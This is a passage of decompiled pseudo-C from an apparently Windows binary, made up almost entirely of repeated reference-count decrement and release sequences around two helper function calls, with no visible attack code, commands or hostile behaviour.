fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1452 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1452 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = ppiStack1700 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack1700 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1284 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1284 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1708 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1708 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1476 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1476 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1716 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1716 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1372 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1372 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = ppiStack1724 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack1724 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1500 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1500 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1732 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1732 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1316 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1316 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1740 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1740 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1524 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1524 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = ppiStack1748 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack1748 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1428 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1428 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1756 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1756 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1548 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1548 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1764 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1764 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1404 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1404 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = ppiStack1772 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack1772 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1572 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1572 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1780 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1780 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = ppiStack1484 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack1484 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1788 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1788 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1596 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1596 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = ppiStack1796 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack1796 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1428 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1428 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1804 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1804 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                